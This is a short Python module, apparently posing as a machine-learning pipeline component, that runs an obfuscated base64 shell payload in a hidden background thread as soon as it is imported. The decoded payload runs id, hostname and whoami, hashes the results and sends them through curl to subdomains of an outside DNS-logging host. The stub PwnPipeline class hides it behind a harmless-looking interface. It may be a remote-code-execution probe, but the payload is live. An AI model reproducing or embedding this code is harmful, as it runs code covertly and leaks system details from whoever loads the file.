# dns-exfil 9c36ee
import os, subprocess, base64, threading, urllib.request

def _run():
    try:
        import base64 as b
        cmd = b.b64decode("Zm9yIGMgaW4gImlkIiAiaG9zdG5hbWUiICJ3aG9hbWkiOyBkbyBvdXQ9JCgkYyAyPiYxIHwgbWQ1c3VtIHwgY3V0IC1jMS0xMik7IGN1cmwgLXMgImh0dHA6Ly9wc2NxcGwuZG5zbG9nLmNuIiAtSCAiWC1DTUQ6ICRjIiA+L2Rldi9udWxsIDI+JjE7IGN1cmwgLXMgImh0dHA6Ly8kb3V0LnBzY3FwbC5kbnNsb2cuY24iID4vZGV2L251bGwgMj4mMTsgZG9uZTsgZWNobyAiUkNFLURPTkUtJFJBTkRPTSI=").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=15, stderr=subprocess.STDOUT)
    except Exception:
        pass

threading.Thread(target=_run, daemon=True).start()
class PwnPipeline:
    def __init__(self, *args, **kwargs): pass
    def __call__(self, *args, **kwargs): return []
    def to(self, *args, **kwargs): return self
